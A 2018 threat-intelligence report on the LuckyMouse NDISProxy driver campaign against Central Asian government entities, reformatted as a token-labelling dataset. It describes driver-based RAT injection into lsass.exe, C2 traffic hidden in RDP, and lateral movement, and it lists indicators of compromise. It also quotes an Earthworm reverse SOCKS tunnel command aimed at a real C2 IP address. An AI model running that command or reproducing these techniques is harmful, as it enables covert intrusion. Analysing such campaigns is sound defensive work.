LuckyMouse signs malicious NDISProxy driver with certificate of Chinese IT company .		others others others others others others others others others others others others
Release_Time :  2018-09-10 .		others others others others
Report_URL :  https://securelist.com/luckymouse-ndisproxy-driver/87914/ .		others others others others others others
Since March 2018 we have discovered several infections where a previously unknown Trojan was injected into the lsass.exe system process memory .\ These implants were injected by the digitally signed 32- and 64-bit network filtering driver NDISProxy .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Interestingly , this driver is signed with a digital certificate that belongs to Chinese company LeagSoft , a developer of information security software based in Shenzhen , Guangdong .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We informed the company about the issue via CN-CERT .		others others others others others others others others others others
The campaign described in this report was active immediately prior to Central Asian high-level meeting and we suppose that actor behind still follows regional political agenda .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
The malware consists of three different modules :  A custom C++ installer that decrypts and drops the driver file in the corresponding system directory , creates a Windows autorun service for driver persistence and adds the encrypted in-memory Trojan to the system registry .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
A network filtering driver ( NDISProxy ) that decrypts and injects the Trojan into memory and filters port 3389 ( Remote Desktop Protocol , RDP ) traffic in order to insert the Trojan ’s C2 communications into it .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
A last-stage C++ Trojan acting as HTTPS server that works together with the driver .		others others others others others others others others others others others others others others others
It waits passively for communications from its C2 , with two possible communication channels via ports 3389 and 443 .		others others others others others others others others others others others others others others others others others others others others
These modules allow attackers to silently move laterally in the infected infrastructure , but don’t allow them to communicate with an external C2 if the new infected host only has a LAN IP .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Because of this , the operators used an Earthworm SOCKS tunneler in order to connect the LAN of the infected host to the external C2 .		others others others others others others others others others others others others others others others others others others others others others others others others others others
They also used the Scanline network scanner to find file shares ( port 135 , Server Message Block , SMB ) which they use to spread malware with administrative passwords , compromised with keyloggers .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We assess with high confidence that NDISProxy is a new tool used by LuckyMouse .		others others others others others others others others others others others others others others others
Kaspersky Lab products detect the described artefacts .		others others others others others others others others
For more information please contact : intelreports@kaspersky.com .		others others others others others others others others others others
We detected the distribution of the 32-bit dropper used for this campaign among different targets by the end of March 2018 .		others others others others others others others others others others others others others others others others others others others others others others
However , we didn’t observe any spear phishing or watering hole activity .		others others others others others others others others others others others others others others others
We believe the operators spread their infectors through networks that were already compromised instead .		others others others others others others others others others others others others others others others
Installer MD5 hash :  dacedff98035f80711c61bc47e83b61d 9dc209f66da77858e362e624d0be86b3 3cbeda2c5ac41cca0b0d60376a2b2511 .		others others others others others others others others
Timestamp ( GMT ) :  2018.03.29 07:35:55 2018.03.26 04:16:00 2018.03.26 04:16:00 .		others others others others others others others others others others others others
The installer logs all the installation process steps in the load.log file within the same directory .		others others others others others others others others others others others others others others others others others
It checks if the OS is Windows Vista or above ( major version equal to 6 or higher ) and decrypts its initial configuration using the DES ( Data Encryption Standard ) algorithm .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The set of well-known port numbers ( HTTP , HTTPS , SMB , POP3S , MSSQL , PPTP and RDP ) in the configuration is not used , which along with the “ [test] ” strings in messages suggests this malware is still under development .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The installer creates a semaphore ( name depending on configuration ) Global\Door-ndisproxy-mn and checks if the service ( name also depends on configuration ) ndisproxy-mn is already installed .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
If it is , the dropper writes “ door detected ” in load.log .		others others others others others others others others others others others others others others
The autorun Windows service running NDISProxy is the “ door ” in developer terms .		others others others others others others others others others others others others others others others
The installer also decrypts ( using the same DES ) the shellcode of the last stage Trojan and saves it in three registry values named xxx0 , xxx1 , xxx2 in key HKLM\SOFTWARE\Classes\32ndisproxy-mn ( or 64ndisproxy-mn for 64-bit hosts ) .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The encrypted configuration is saved as the value filterpd-ndisproxy-mn in the registry key HKCR\ndisproxy-mn .		others others others others others others others others others others others others others others others
Driver MD5 hash :  8e6d87eadb27b74852bd5a19062e52ed d21de00f981bb6b5094f9c3dfa0be533 a2eb59414823ae00d53ca05272168006 493167e85e45363d09495d0841c30648 ad07b44578fa47e7de0df42a8b7f8d2d .		others others others others others others others others others others
Timestamp :  2018.03.29 07:33:58 2018.03.29 07:33:52 2018.03.26 04:15:28	2018.03.26 04:15:21 2017.11.08 08:04:50 .		others others others others others others others others others others others others others
This digitally signed driver is the most interesting artefact used in this campaign .		others others others others others others others others others others others others others others
The network filtering modules serve two purposes :  first they decrypt and inject the RAT ; second , they set its communication channel through RDP port 3389 .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The drivers are signed with a digital certificate issued by VeriSign to LeagSoft , a company developing information security software such as data loss prevention ( DLP ) solutions .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This driver makes extensive use of third-party publicly available C source code , including from the Blackbone repository available at GitHub .		others others others others others others others others others others others others others others others others others others others others others others
Feature :  Driver memory injection NDIS network filtering driver Parse HTTP packets .		others others others others others others others others others others others others others
Public repository :  Blackbone https://github.com/DarthTon/Blackbone Microsoft Windows Driver Kit ( WDK ) sample code “ Windows Filtering Platform Stream Edit Sample/C++/sys/stream_callout.c ” Http-parser https://github.com/nodejs/http-parser .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The driver combines all the Trojan-related registry values from HKLM\SOFTWARE\Classes\32ndisproxy-mn and de-XORs them with a six-byte hardcoded value .		others others others others others others others others others others others others others others others others others others others
It then injects the resulting Trojan executable shellcode into lsass.exe memory using Blackbone library functions .		others others others others others others others others others others others others others others others others
NDISProxy works as a network traffic filter engine , filtering the traffic going through RDP port 3389 ( the port number is hardcoded ) and injecting messages into it .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
The communication between the user-mode in-memory Trojan and the driver goes through the custom control codes used by the DeviceIoControl() Windows API function .		others others others others others others others others others others others others others others others others others others others others others others others others others others
Apart from the auxiliary codes , there are two codes worth mentioning :  Meaning :  Start traffic filtering at RDP port 3389 Inject given data into filtering TCP stream .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
Used for Trojan communication with C2 .		others others others others others others others
SHA256 :  c69121a994ea8ff188510f41890208625710870af9a06b005db817934b517bc1 .		others others others others
MD5 :  6a352c3e55e8ae5ed39dc1be7fb964b1 .		others others others others
Compiled :  2018.03.26 04:15:48 ( GMT ) .		others others others others others others others others
This RAT is decrypted by the NDISProxy driver from the system registry and injected into the lsass.exe process memory .		others others others others others others others others others others others others others others others others others others others others
Code starts with a shellcode – instead of typical Windows portable executable files loader this malware implements memory mapping by itself .		others others others others others others others others others others others others others others others others others others others others others others
This Trojan is a full-featured RAT capable of executing common tasks such as command execution and downloading/uploading files .		others others others others others others others others others others others others others others others others others others others
This is implemented through a couple dozen C++ classes such as CMFile , CMFile , CMProcess , TFileDownload , TDrive , TProcessInfo , TSock , etc .		others others others others others others others others others others others others others others others others others others others others others others others others others others others
The first stage custom installer utilizes the same classes .		others others others others others others others others others others
The Trojan uses HTTP Server API to filter HTTPS packets at port 443 and parse commands .		others others others others others others others others others others others others others others others others others
This Trojan is used by attackers to gather a target ’s data , make lateral movements and create SOCKS tunnels to their C2 using the Earthworm tunneler .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
This tool is publicly available and popular among Chinese-speaking actors .		others others others others others others others others others others others
Given that the Trojan is an HTTPS server itself , we believe that the SOCKS tunnel is used for targets without an external IP , so the C2 is able to send commands .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We found that this campaign targeted Middle Asian governments ’ entities .		others others others others others others others others others others others others
We assess with high confidence that the Chinese-speaking LuckyMouse actor is responsible for this new campaign using the NDISProxy tool described in this report .		others others others others others others others others others others others others others others others others others others others others others others others others others
In particular , the choice of the Earthworm tunneler is typical for Chinese-speaking actors .		others others others others others others others others others others others others others others others
Also , one of the commands used by the attackers ( “ -s rssocks -d 103.75.190.28 -e 443 ” ) creates a tunnel to a previously known LuckyMouse C2 .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We have observed a gradual shift in several Chinese-speaking campaigns towards a combination of publicly available tools ( such as Metasploit or CobaltStrike ) and custom malware ( like the C++ last stage RAT described in this report ) .		others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others others
We have also observed how different actors adopt code from GitHub repositories on a regular basis .		others others others others others others others others others others others others others others others others others
This campaign appears to demonstrate once again LuckyMouse ’s interest in Central Asia and the political agenda surrounding the Shanghai Cooperation Organization .		others others others others others others others others others others others others others others others others others others others others others others others others
Note :  The indicators in this section are valid at the time of publication .		others others others others others others others others others others others others others others others
Any future changes will be updated directly in the corresponding .ioc file .		others others others others others others others others others others others others others
File Hashes :  Droppers-installers 9dc209f66da77858e362e624d0be86b3 dacedff98035f80711c61bc47e83b61d .		others others others others others others others
Drivers :  8e6d87eadb27b74852bd5a19062e52ed d21de00f981bb6b5094f9c3dfa0be533 a2eb59414823ae00d53ca05272168006 493167e85e45363d09495d0841c30648 ad07b44578fa47e7de0df42a8b7f8d2d .		others others others others others others others others
Auxiliary Earthworm SOCKS tunneler and Scanline network scanner :  83c5ff660f2900677e537f9500579965 3a97d9b6f17754dcd38ca7fc89caab04 .		others others others others others others others others others others others others
Domains and IPs :  103.75.190.28 213.109.87.58 .		others others others others others others others
Semaphores :  Global\Door-ndisproxy-mn Global\Door-ndisproxy-help Global\Door-ndisproxy-notify .		others others others others others others
Services :  ndisproxy-mn ndisproxy-help ndisproxy-notify .		others others others others others others
Registry keys and values :  HKLM\SOFTWARE\Classes\32ndisproxy-mn HKLM\SOFTWARE\Classes\64ndisproxy-mn HKCR\ndisproxy-mn\filterpd-ndisproxy-mn HKLM\SOFTWARE\Classes\32ndisproxy-help HKLM\SOFTWARE\Classes\64ndisproxy-help HKCR\ndisproxy-mn\filterpd-ndisproxy-help HKLM\SOFTWARE\Classes\32ndisproxy-notify HKLM\SOFTWARE\Classes\64ndisproxy-notify HKCR\ndisproxy-mn\filterpd-ndisproxy-notify .		others others others others others others others others others others others others others others others
ShenZhen LeagSoft Technology Co. ,Ltd .		others others others others others others others
: 78 62 07 2d dc 75 9e 5f 6a 61 4b e9 b9 3b d5 21 VeriSign Class 3 Code Signing 2010 CA 2018-07-19 .		others others others others others others others others others others others others others others others others others others others others others others others others others others